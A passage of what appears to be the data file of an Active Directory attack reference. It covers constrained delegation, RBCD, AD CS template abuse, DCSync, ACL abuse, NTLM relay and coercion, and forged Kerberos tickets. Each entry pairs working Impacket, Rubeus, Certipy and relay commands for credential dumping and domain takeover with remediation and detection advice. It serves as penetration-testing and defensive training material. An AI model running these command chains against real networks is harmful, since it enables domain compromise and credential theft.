              { label: "1. Identify accounts allowed to delegate (constrained)", cmd: "# accounts with msDS-AllowedToDelegateTo set, TRUSTED_TO_AUTH_FOR_DELEGATION UAC flag\nGet-DomainUser -TrustedToAuth -Properties cn,msds-allowedtodelegateto\nGet-DomainComputer -TrustedToAuth -Properties cn,msds-allowedtodelegateto" },
              { label: "2. Request S4U2Self + S4U2Proxy as the impersonated user", cmd: "getST.py -spn cifs/dc01.corp.local -impersonate Administrator \\\n  corp.local/svc_web:'Passw0rd'\n#   -spn           an allowed target service (from msDS-AllowedToDelegateTo)\n#   -impersonate   the user you want a ticket as (any user, incl. Administrator)\n#   svc_web:...    the compromised delegation account\n# yields Administrator@... .ccache for cifs/dc01" },
              { label: "3. Swap the SPN — the service class in the TGS is plaintext", cmd: "Rubeus.exe s4u /user:svc_web /rc4:<NTLM_of_svc_web> \\\n  /impersonateuser:Administrator /msdsspn:cifs/dc01 /altservice:http /ptt\n#   /altservice:http  rewrite cifs -> http to reach the web service on dc01\n#   /ptt              inject the resulting ticket into the current session\n# one delegated SPN often unlocks cifs, http, host, etc. on the same host" },
              { label: "4. Bronze Bit (CVE-2020-17049) — defeat the 'not forwardable' protection", cmd: "# when the KDC withholds the Forwardable flag (e.g. Protected Users / sensitive target),\n# a known service key lets you flip it during S4U\ngetST.py -spn cifs/dc01.corp.local -impersonate Administrator -force-forwardable \\\n  corp.local/svc_web -hashes :<NTLM_of_svc_web>" },
              { label: "5. Use the ticket", cmd: "export KRB5CCNAME='Administrator@cifs_dc01.corp.local@CORP.LOCAL.ccache'\nsecretsdump.py -k -no-pass dc01.corp.local   # or psexec/smbexec as Administrator" }
            ]
          },
          {
            title: "How Protocol Transition Works",
            type: "table",
            columns: ["Extension", "What it does"],
            rows: [
              ["S4U2Self", "The service gets a ticket to ITSELF as any chosen user — even one who never logged in"],
              ["S4U2Proxy", "Uses that ticket to get a ticket to an allowed target service, as that user"],
              ["TRUSTED_TO_AUTH_FOR_DELEGATION", "UAC flag that lets the KDC issue a forwardable S4U2Self ticket"],
              ["Plaintext SPN", "The service name in the TGS is not integrity-protected — swap cifs↔http↔host"],
              ["Bronze Bit", "CVE-2020-17049 — forge the Forwardable flag when the KDC withholds it"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Compromise an account with constrained delegation", "S4U-capable identity + its key/NTLM"],
              ["2", "S4U2Self as Administrator", "Forwardable ticket to self as the admin"],
              ["3", "S4U2Proxy to an allowed SPN", "Service ticket to the target as Administrator"],
              ["4", "Swap the SPN service class if needed", "Reach other services on the same host"],
              ["5", "Authenticate to the target service", "Admin access — often to a DC"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["PowerView / BloodHound", "Find constrained-delegation accounts and targets"],
              ["Impacket getST.py", "Perform S4U2Self/Proxy, including -force-forwardable (Bronze Bit)"],
              ["Rubeus", "s4u with /altservice SPN swapping and /ptt"],
              ["Impacket secretsdump / psexec", "Act on the target with the impersonation ticket"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation", url: "https://hadess.io/" },
              { label: "The Hacker Recipes — Constrained delegation", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/constrained" },
              { label: "CVE-2020-17049 — Kerberos Bronze Bit", url: "https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-theory/" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Minimise constrained delegation; where required, delegate to the narrowest set of specific SPNs and avoid delegating to DC services.",
              "Place Tier-0 / high-value accounts in Protected Users and mark them 'sensitive and cannot be delegated'.",
              "Patch the Bronze Bit (November 2020 updates) so the Forwardable flag cannot be forged.",
              "Rotate the keys of any account configured for delegation if compromise is suspected.",
              "Detect: S4U2Self/Proxy activity (event 4769) for privileged users from delegation accounts."
            ]
          }
        ]
      },
      {
        id: "rbcd",
        name: "Resource-Based Constrained Delegation (RBCD)",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1134/",
        theory: "theory/2026-08-18-delegation.html",
        description: "Write access to a computer object lets an attacker configure delegation onto it and impersonate any user to that host — often achievable from a plain foothold.",
        brief: "RBCD moves the delegation trust decision onto the target resource, via its msDS-AllowedToActOnBehalfOfOtherIdentity attribute. Write that attribute — through an ACL you hold or a relayed LDAP session — pointing it at an account you control, then impersonate any user to the target.\n\nImpact: because a normal user can create computer accounts by default (MachineAccountQuota = 10), and write access to a computer object is common, the whole chain is frequently achievable from a low-privilege foothold, ending in full takeover of the target host.",
        quickReference: [
          { label: "Create a computer account you control", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
          { label: "Write RBCD on the target", cmd: "rbcd.py -delegate-from EVIL$ -delegate-to TARGET$ -action write -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'" },
          { label: "Impersonate Administrator to the target", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator corp.local/EVIL$:'Pass123!'" },
          { label: "Set up via NTLM relay instead", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you can write the target computer's attributes", cmd: "# BloodHound: GenericWrite / GenericAll / WriteAccountRestrictions over TARGET$\n# any of these lets you write msDS-AllowedToActOnBehalfOfOtherIdentity" },
              { label: "2. Create a controlled account with an SPN (a computer account has one)", cmd: "addcomputer.py -computer-name EVIL$ -computer-pass 'Pass123!' \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   MachineAccountQuota (default 10) lets any user create up to 10 of these" },
              { label: "3. Point the target's RBCD attribute at your account", cmd: "rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \\\n  -dc-ip 10.10.10.10 corp.local/jdoe:'Passw0rd'\n#   writes msDS-AllowedToActOnBehalfOfOtherIdentity on TARGET$ to trust EVIL$" },
              { label: "4. Impersonate a privileged user to the target via S4U", cmd: "getST.py -spn cifs/target.corp.local -impersonate Administrator \\\n  corp.local/EVIL$:'Pass123!'\n#   -spn cifs/target   the service on the target you want\n#   -impersonate       any user, e.g. Administrator\n# yields Administrator@cifs_target.ccache" },
              { label: "5. Use it", cmd: "export KRB5CCNAME='Administrator@cifs_target.corp.local@CORP.LOCAL.ccache'\npsexec.py -k -no-pass target.corp.local   # SYSTEM shell on the target" }
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Gain write over a computer object (ACL or relay)", "Ability to set RBCD on the target"],
              ["2", "Create/own an account with an SPN", "Principal that can be delegated from"],
              ["3", "Write msDS-AllowedToActOnBehalfOfOtherIdentity", "Target now trusts your account to delegate"],
              ["4", "S4U2Self + S4U2Proxy as Administrator", "Service ticket to the target as admin"],
              ["5", "PsExec / secretsdump to the target", "SYSTEM on the host"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket addcomputer.py", "Create a controlled computer account"],
              ["Impacket rbcd.py / bloodyAD", "Write the RBCD attribute on the target"],
              ["Impacket getST.py", "S4U impersonation to obtain the ticket"],
              ["ntlmrelayx.py", "--delegate-access to configure RBCD via a relayed LDAP session"],
              ["BloodHound", "Find write access over computer objects"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "Hadess — Pwning the Domain: Kerberos Delegation (RBCD)", url: "https://hadess.io/" },
              { label: "Elad Shamir — Wagging the Dog (RBCD)", url: "https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html" },
              { label: "The Hacker Recipes — RBCD", url: "https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Set MachineAccountQuota to 0 so ordinary users cannot create the computer account the chain needs.",
              "Audit and tighten ACLs on computer objects; GenericWrite/GenericAll for non-admins is the enabling condition.",
              "Enforce LDAP signing and channel binding to close the relay route into RBCD setup.",
              "Place Tier-0 accounts in Protected Users to limit impersonation.",
              "Detect: writes to msDS-AllowedToActOnBehalfOfOtherIdentity (event 5136) and new computer accounts created by user principals."
            ]
          }
        ]
      },
      {
        id: "adcs-esc",
        name: "AD CS Template Abuse (ESC1–ESC8)",
        severity: "Critical",
        ref: "https://posts.specterops.io/certified-pre-owned-d95910965cd2",
        theory: "theory/2026-08-18-adcs.html",
        description: "Misconfigured certificate templates or CA endpoints let an attacker obtain a certificate as anyone, then authenticate as them via PKINIT — often the shortest path to Domain Admin.",
        brief: "A certificate with a client-authentication EKU can be exchanged for a Kerberos TGT via PKINIT, so any AD CS misconfiguration that lets you enrol a certificate for an identity you should not control is a path to becoming that identity — frequently a domain admin or a DC.\n\nImpact: certificates are long-lived and survive password resets, making this both an escalation and a durable persistence primitive. The ESC1–ESC8 classes catalogue the misconfigurations; Certipy finds and exploits them.",
        quickReference: [
          { label: "Find vulnerable templates/CAs", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout" },
          { label: "ESC1 — request a cert as Administrator", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -ca CORP-CA -template VulnTemplate -upn administrator@corp.local" },
          { label: "Authenticate with the cert (PKINIT → TGT + NT hash)", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10" },
          { label: "ESC8 — relay a coerced DC to the CA web endpoint", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController" }
        ],
        sections: [
          {
            title: "How It's Exploited (ESC1 walkthrough)",
            type: "commands",
            commands: [
              { label: "1. Enumerate the CA and templates for misconfigurations", cmd: "certipy find -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 -vulnerable -stdout\n# flags each template's ESC condition (ESC1..ESC8) and who can enrol" },
              { label: "2. ESC1 — the template lets the enrollee supply the subject (SAN)", cmd: "certipy req -u jdoe@corp.local -p 'Passw0rd' -dc-ip 10.10.10.10 \\\n  -ca CORP-CA -template VulnTemplate -upn administrator@corp.local\n#   -upn administrator@corp.local  request the cert AS the domain admin\n#   the client-auth EKU + ENROLLEE_SUPPLIES_SUBJECT makes this possible\n# outputs administrator.pfx" },
              { label: "3. Authenticate with the certificate via PKINIT", cmd: "certipy auth -pfx administrator.pfx -dc-ip 10.10.10.10\n# returns a TGT for Administrator AND (via UnPAC-the-hash) their NT hash" },
              { label: "4. ESC8 — coerce a DC and relay its auth to the CA web endpoint", cmd: "# terminal 1: relay to the certsrv web enrolment, ask for a DC-template cert\nntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# terminal 2: coerce the DC's machine account to authenticate to us\nPetitPotam.py -u jdoe -p 'Passw0rd' attacker_ip dc01_ip\n# a DC certificate comes back -> certipy auth -pfx dc01.pfx -> DC TGT" },
              { label: "5. Use the identity", cmd: "certipy auth -pfx administrator.pfx   # or dc01.pfx\nexport KRB5CCNAME=administrator.ccache\nsecretsdump.py -k -no-pass dc01.corp.local" }
            ]
          },
          {
            title: "Key ESC Classes",
            type: "table",
            columns: ["ESC", "Misconfiguration"],
            rows: [
              ["ESC1", "Template: enrollee supplies subject (SAN) + client-auth EKU + low-priv enrol → request as anyone"],
              ["ESC2/3", "Any-Purpose / Enrollment Agent templates usable to authenticate as others"],
              ["ESC4", "Write access to a template object → reconfigure it into ESC1"],
              ["ESC6", "CA flag EDITF_ATTRIBUTESUBJECTALTNAME2 → any request can set a SAN"],
              ["ESC7", "Dangerous rights over the CA itself (ManageCA / ManageCertificates)"],
              ["ESC8", "CA web enrolment accepts NTLM without EPA → relay a coerced DC for a cert"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "certipy find -vulnerable", "The exploitable ESC condition on a template/CA"],
              ["2", "Request a certificate for a privileged identity", "A .pfx as Administrator / a DC"],
              ["3", "certipy auth (PKINIT)", "TGT + NT hash of that identity"],
              ["4", "(ESC8) coerce DC + relay to CA", "DC certificate without any template misconfig"],
              ["5", "DCSync / act as the identity", "Domain compromise + durable cert persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Certipy", "Enumerate (find) and exploit (req/auth) every ESC class"],
              ["ntlmrelayx.py", "--adcs relay to the CA web endpoint (ESC8)"],
              ["PetitPotam / Coercer", "Coerce a DC to authenticate for the relay"],
              ["Impacket secretsdump.py", "DCSync with the resulting TGT"],
              ["Certify / Rubeus", "Windows-side enrolment and PKINIT"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "SpecterOps — Certified Pre-Owned", url: "https://posts.specterops.io/certified-pre-owned-d95910965cd2" },
              { label: "Certipy wiki — ESC1–ESC16", url: "https://github.com/ly4k/Certipy/wiki" },
              { label: "The Hacker Recipes — AD CS", url: "https://www.thehacker.recipes/ad/movement/ad-cs" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit templates and the CA with Certipy/PSPKIAudit; remove ENROLLEE_SUPPLIES_SUBJECT where not genuinely required (ESC1).",
              "Enforce EPA and disable NTLM on the CA web enrolment endpoint (ESC8).",
              "Restrict template enrolment rights and CA management rights to the minimum (ESC4/ESC7).",
              "Clear the EDITF_ATTRIBUTESUBJECTALTNAME2 flag on the CA (ESC6); require manager approval on sensitive templates.",
              "Detect: certificates issued for a privileged SAN to a low-priv requester; enable CA issuance logging."
            ]
          }
        ]
      },
      {
        id: "dcsync-vuln",
        name: "DCSync",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1003/006/",
        theory: "theory/2026-08-18-dcsync.html",
        description: "A principal with replication rights asks a DC to replicate secrets, extracting any account's hashes — including krbtgt — without running code on the DC.",
        brief: "DCSync abuses the legitimate directory-replication protocol (MS-DRSR) that DCs use to sync with each other. Any principal holding DS-Replication-Get-Changes and Get-Changes-All on the domain object can request an account's secrets from a DC — over the network, with no code execution on the DC and no touching of NTDS.dit on disk.\n\nImpact: the prize is the krbtgt key, which enables Golden Tickets and durable domain persistence. Because replication rights are just ACEs, a non-admin granted them is a straight line to full compromise.",
        quickReference: [
          { label: "Dump everything (Impacket)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01" },
          { label: "Just krbtgt", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01" },
          { label: "NetExec", cmd: "netexec smb dc01 -u admin -p 'Passw0rd' --ntds" },
          { label: "Mimikatz", cmd: "lsadump::dcsync /domain:corp.local /user:krbtgt" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Confirm you hold replication rights on the domain object", cmd: "# BloodHound edge: DCSync / GetChanges + GetChangesAll on the domain\n# these come with Domain Admin, or can be granted directly to any principal (an ACL win)" },
              { label: "2. Replicate the krbtgt secret from a DC", cmd: "secretsdump.py -just-dc-user krbtgt corp.local/admin:'Passw0rd'@dc01\n#   -just-dc-user krbtgt   pull only the krbtgt account's hashes\n# note the NTLM hash AND the aes256 key for the Golden Ticket" },
              { label: "3. Or replicate every account (full NTDS over the wire)", cmd: "secretsdump.py -just-dc corp.local/admin:'Passw0rd'@dc01 -outputfile ntds\n# never touches NTDS.dit on disk; looks like normal DC replication" },
              { label: "4. Turn krbtgt into durable persistence (Golden Ticket)", cmd: "ticketer.py -nthash <krbtgt_nthash> -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache   # forge TGTs for anyone, survives password resets" }
            ]
          },
          {
            title: "Rights That Permit It",
            type: "table",
            columns: ["Right", "Purpose"],
            rows: [
              ["DS-Replication-Get-Changes", "Replicate standard directory data"],
              ["DS-Replication-Get-Changes-All", "Replicate SECRET attributes — the one that yields hashes"],
              ["Held by default", "Domain Admins, Enterprise Admins, and DCs"],
              ["The real risk", "A non-admin principal granted these via an ACL"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Obtain a principal with replication rights", "DCSync capability"],
              ["2", "Request krbtgt (and/or all) secrets from a DC", "Hashes without touching the DC disk"],
              ["3", "Pass-the-hash / crack DA hashes", "Immediate high privilege"],
              ["4", "Forge a Golden Ticket with the krbtgt key", "Durable, domain-wide persistence"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Impacket secretsdump.py", "DCSync over MS-DRSR (-just-dc)"],
              ["NetExec", "--ntds convenience wrapper"],
              ["Mimikatz", "lsadump::dcsync from a Windows host"],
              ["Impacket ticketer.py", "Forge a Golden Ticket from the krbtgt key"],
              ["BloodHound", "Find non-admins that hold replication rights"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1003.006 — DCSync", url: "https://attack.mitre.org/techniques/T1003/006/" },
              { label: "The Hacker Recipes — DCSync", url: "https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Audit replication rights on the domain object; only DCs and top-tier admins should hold Get-Changes-All.",
              "Rotate the krbtgt password twice (with a replication interval between) after any suspected Tier-0 compromise.",
              "Protect Tier-0 accounts and keep them off lower-tier systems.",
              "Detect: DRSGetNCChanges (replication) requests from source IPs that are not domain controllers — the primary signal.",
              "Alert on unexpected new DC objects (catches the DCShadow write-side variant)."
            ]
          }
        ]
      },
      {
        id: "ad-acl-abuse",
        name: "Dangerous AD ACLs",
        severity: "High",
        ref: "https://bloodhound.readthedocs.io/",
        theory: "theory/2026-08-18-acls-dacls.html",
        description: "Over-permissive object permissions (GenericAll, WriteDACL, ForceChangePassword) chain across objects into a path to Domain Admin.",
        brief: "Access to AD objects is governed by ACLs, and a small set of rights can be turned into control of the object they sit on. In a large domain these accumulate for years, and a single misconfigured ACE can be the first link in a multi-hop path from a low-priv foothold to Domain Admin.\n\nImpact: BloodHound computes these chains automatically; each dangerous right converts to password reset, group addition, targeted Kerberoast/AS-REP, RBCD, Shadow Credentials, or DCSync.",
        quickReference: [
          { label: "Find paths (BloodHound)", cmd: "SharpHound / bloodhound-python -> 'Shortest Path to Domain Admins'" },
          { label: "Reset a password (ForceChangePassword)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'" },
          { label: "Add self to a group (GenericAll/AddMember)", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local add groupMember 'Helpdesk Admins' jdoe" },
          { label: "Grant yourself DCSync (WriteDACL on domain)", cmd: "dacledit.py -action write -rights DCSync -principal jdoe -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Map outbound control from your foothold", cmd: "# collect then, in BloodHound, mark your user Owned and run:\n#   Shortest Path from Owned Principals / Outbound Object Control\n# each edge (GenericAll, WriteDacl, ForceChangePassword, AddMember...) is an action" },
              { label: "2. ForceChangePassword — take over a user", cmd: "bloodyAD -u jdoe -p 'Passw0rd' -d corp.local set password TARGET 'NewPass123!'\n# then authenticate as TARGET" },
              { label: "3. GenericWrite over a user — targeted Kerberoast or Shadow Credentials", cmd: "# add an SPN and roast:\nbloodyAD -u jdoe -p pass -d corp.local set object TARGET servicePrincipalName -v 'fake/svc'\n# or write a Shadow Credential (no password reset needed):\npywhisker -d corp.local -u jdoe -p pass --target TARGET --action add" },
              { label: "4. GenericAll over a computer — RBCD to full takeover", cmd: "# see the RBCD entry: write msDS-AllowedToActOnBehalfOfOtherIdentity and impersonate" },
              { label: "5. WriteDACL over the domain — grant yourself DCSync", cmd: "dacledit.py -action write -rights DCSync -principal jdoe \\\n  -target-dn 'DC=corp,DC=local' corp.local/jdoe:'Passw0rd'\n# then secretsdump.py -just-dc" }
            ]
          },
          {
            title: "Dangerous Rights",
            type: "table",
            columns: ["Right", "Turns into"],
            rows: [
              ["GenericAll", "Full control — reset password, add SPN, write any attribute"],
              ["GenericWrite", "Targeted Kerberoast, Shadow Credentials, logon-script abuse"],
              ["WriteDACL", "Grant yourself GenericAll or DCSync, then anything"],
              ["WriteOwner", "Take ownership, then rewrite the DACL"],
              ["ForceChangePassword", "Reset the target's password without the current one"],
              ["AddMember", "Add yourself to a privileged group"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "BloodHound outbound control from foothold", "The dangerous ACE and the path"],
              ["2", "Exercise the first right (reset / add SPN / add member)", "Control of the next principal"],
              ["3", "Repeat across the chain", "Escalation hop by hop"],
              ["4", "Reach a Tier-0 right (WriteDACL on domain / group)", "DCSync or Domain Admin membership"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["BloodHound / SharpHound", "Compute the ACL attack paths"],
              ["bloodyAD", "Reset passwords, add group members, write attributes"],
              ["Impacket dacledit.py", "Grant rights / DCSync via ACL edits"],
              ["pyWhisker", "Shadow Credentials via msDS-KeyCredentialLink"],
              ["PowerView", "Enumerate and abuse ACLs from Windows"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "BloodHound docs — edges/abuse", url: "https://bloodhound.readthedocs.io/" },
              { label: "The Hacker Recipes — ACL abuse", url: "https://www.thehacker.recipes/ad/movement/dacl" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Run BloodHound yourself and prune the dangerous edges and shortest paths to Tier-0.",
              "Apply least privilege on delegation of administration — grant the narrowest right over the smallest scope.",
              "Adopt a tiered administration model so a low-tier ACL win cannot reach high-tier accounts.",
              "Monitor DACL modifications (event 5136) on sensitive objects and watch AdminSDHolder for persistence.",
              "Review and remove inherited/legacy ACEs regularly."
            ]
          }
        ]
      },
      {
        id: "ntlm-relay-vuln",
        name: "NTLM Relay & Coercion",
        severity: "High",
        ref: "https://attack.mitre.org/techniques/T1557/001/",
        theory: "theory/2026-08-18-coercion-ntlm-relay.html",
        description: "Authentication is captured or coerced, then relayed live to a service missing its relay protection (SMB, LDAP, AD CS) to act as the victim.",
        brief: "NTLM relay takes an authentication a victim was tricked into starting and forwards it, in real time, to a service that will accept it — acting as the victim there. Coercion makes it reliable: certain RPC methods force a target (ideally a DC's machine account) to authenticate on command.\n\nImpact: relaying succeeds only where a protection is missing — SMB signing off, LDAP channel binding off, or EPA not enforced on AD CS web enrolment. Coercing a DC and relaying to AD CS (ESC8) is a leading path to domain compromise.",
        quickReference: [
          { label: "Find SMB targets without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
          { label: "Poison + capture/relay", cmd: "responder -I eth0 -A   (analyze) ; set SMB/HTTP Off to relay" },
          { label: "Relay to LDAP for RBCD", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support" },
          { label: "Coerce a host to authenticate", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Enumerate relay targets (missing protection is the whole game)", cmd: "# hosts without SMB signing are relayable:\nnetexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
              { label: "2. Stand up the relay, then generate the authentication", cmd: "# relay to SMB targets and drop to an interactive session on success\nntlmrelayx.py -tf targets.txt -smb2support -i\n# obtain the auth by poisoning (Responder) or by coercion (below)" },
              { label: "3. Coerce a DC to authenticate to you (deterministic)", cmd: "coercer coerce -t dc01 -l attacker_ip -u jdoe -p 'Passw0rd' -d corp.local\n#   -t target to coerce, -l where it should authenticate back to\n# sprays MS-RPRN/MS-EFSRPC/MS-DFSNM/MS-FSRVP" },
              { label: "4. ESC8 — relay the DC's auth to AD CS for a certificate", cmd: "ntlmrelayx.py -t http://ca01/certsrv/certfnsh.asp -smb2support --adcs --template DomainController\n# the DC cert -> certipy auth -> DC TGT -> domain compromise" },
              { label: "5. Or relay to LDAP and configure RBCD on the coerced machine", cmd: "ntlmrelayx.py -t ldap://dc01 --delegate-access -smb2support\n# then getST.py -impersonate Administrator against the coerced host" }
            ]
          },
          {
            title: "Relay Targets & Conditions",
            type: "table",
            columns: ["Target", "Requires / yields"],
            rows: [
              ["SMB", "SMB signing NOT required → SAM/LSA dump, command execution"],
              ["LDAP / LDAPS", "Channel binding off → RBCD, Shadow Credentials, DCSync rights"],
              ["AD CS web (ESC8)", "EPA not enforced → a certificate as the victim → a TGT"],
              ["Rule", "You cannot relay auth back to the host it came from — relay elsewhere"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
              ["1", "Find a service missing its relay protection", "A valid relay target"],
              ["2", "Coerce/poison a victim to authenticate to you", "Live NTLM authentication in hand"],
              ["3", "Relay it to the target (SMB/LDAP/AD CS)", "Action as the victim"],
              ["4", "ESC8: DC auth → CA cert; or LDAP → RBCD", "DC TGT / host takeover"],
              ["5", "DCSync / impersonate", "Domain compromise"]
            ]
          },
          {
            title: "Tools Used",
            type: "table",
            columns: ["Tool", "Purpose"],
            rows: [
              ["Responder", "LLMNR/NBT-NS poisoning to capture/relay"],
              ["Coercer / PetitPotam / PrinterBug", "Force a target to authenticate on demand"],
              ["Impacket ntlmrelayx.py", "Relay the authentication to SMB/LDAP/AD CS"],
              ["NetExec", "--gen-relay-list to find unsigned SMB hosts"],
              ["Certipy", "Turn a relayed AD CS certificate into a TGT"]
            ]
          },
          {
            title: "References",
            type: "references",
            items: [
              { label: "MITRE ATT&CK T1557.001 — LLMNR/NBT-NS Poisoning and Relay", url: "https://attack.mitre.org/techniques/T1557/001/" },
              { label: "The Hacker Recipes — NTLM relay", url: "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
            ]
          },
          {
            title: "Remediation",
            type: "notes",
            items: [
              "Require SMB signing everywhere — the single most important control; it breaks SMB relay.",
              "Enforce LDAP channel binding and signing to close the RBCD/Shadow-Credential relay paths.",
              "Enable EPA on AD CS web enrolment and disable NTLM there to kill ESC8.",
              "Disable the Print Spooler on DCs and disable LLMNR/NBT-NS to remove coercion and poisoning triggers.",
              "Detect: authentication from a DC machine account to an unexpected host; patch coercion methods as they appear."
            ]
          }
        ]
      },
      {
        id: "kerberos-ticket-attacks",
        name: "Golden, Silver & Diamond Tickets",
        severity: "Critical",
        ref: "https://attack.mitre.org/techniques/T1558/001/",
        theory: "theory/2026-08-18-kerberos.html",
        description: "With stolen key material, forge Kerberos tickets — a Silver ticket for one service, a Golden ticket for the whole domain, a Diamond ticket to evade detection.",
        brief: "Once key material is stolen, an attacker stops requesting tickets and forges them. A Silver Ticket is a forged service ticket (from a service account key), accepted by that one service without contacting the DC. A Golden Ticket is a forged TGT (from the krbtgt key) that impersonates anyone domain-wide and survives password resets. A Diamond Ticket modifies a real TGT to look legitimate.\n\nImpact: these are the persistence endgame of AD compromise — which is why krbtgt theft means the domain must be considered fully compromised until krbtgt is rotated twice.",
        quickReference: [
          { label: "Golden Ticket (krbtgt key)", cmd: "ticketer.py -nthash <krbtgt_hash> -domain-sid <sid> -domain corp.local Administrator" },
          { label: "Silver Ticket (service key)", cmd: "ticketer.py -nthash <service_hash> -domain-sid <sid> -domain corp.local -spn cifs/srv01 Administrator" },
          { label: "Overpass-the-Hash (NT hash → TGT)", cmd: "getTGT.py corp.local/svc -hashes :<nthash>" },
          { label: "Pass-the-Ticket", cmd: "export KRB5CCNAME=ticket.ccache   (then -k -no-pass)" }
        ],
        sections: [
          {
            title: "How It's Exploited",
            type: "commands",
            commands: [
              { label: "1. Overpass-the-Hash — turn an NT hash into a real TGT", cmd: "getTGT.py corp.local/svc -hashes :<nthash>\nexport KRB5CCNAME=svc.ccache\n# from here you use Kerberos, which looks entirely normal" },
              { label: "2. Silver Ticket — forge a service ticket with a service/computer key", cmd: "ticketer.py -nthash <service_or_machine_hash> -domain-sid <domain_sid> \\\n  -domain corp.local -spn cifs/srv01.corp.local Administrator\n#   -spn        the single service the ticket is valid for\n# the KDC is never contacted at use time -> minimal telemetry" },
              { label: "3. Golden Ticket — forge a TGT with the krbtgt key (from DCSync)", cmd: "ticketer.py -nthash <krbtgt_nthash> -aesKey <krbtgt_aes256> \\\n  -domain-sid <domain_sid> -domain corp.local Administrator\nexport KRB5CCNAME=Administrator.ccache\n# impersonate anyone, including fabricated admins; survives password resets" },
              { label: "4. Diamond Ticket — modify a real TGT (stealthier than Golden)", cmd: "# request a legit TGT, decrypt with the krbtgt key, edit the PAC, re-encrypt\nRubeus.exe diamond /krbkey:<krbtgt_aes> /user:jdoe /password:pass \\\n  /ticketuser:Administrator /ticketuserid:500 /groups:512\n# the ticket has a matching legitimate 4768 request -> harder to spot" },
              { label: "5. Use the forged ticket", cmd: "psexec.py -k -no-pass dc01.corp.local   # or secretsdump / any Kerberos tool" }
            ]
          },
          {
            title: "The Family",
            type: "table",
            columns: ["Attack", "Key needed / scope"],
            rows: [
              ["Overpass-the-Hash", "A user's NT hash → a legitimate TGT for that user"],
              ["Pass-the-Ticket", "A stolen TGT/service ticket → reuse its access"],
              ["Silver Ticket", "A service/computer key → forge a ticket for that one service (very stealthy)"],
              ["Golden Ticket", "The krbtgt key → forge TGTs for anyone, domain-wide, durable"],
              ["Diamond Ticket", "The krbtgt key → modify a real TGT (evades 'ticket with no request' detection)"]
            ]
          },
          {
            title: "Attack Chain",
            type: "table",
            columns: ["Step", "Action", "Result"],
            rows: [
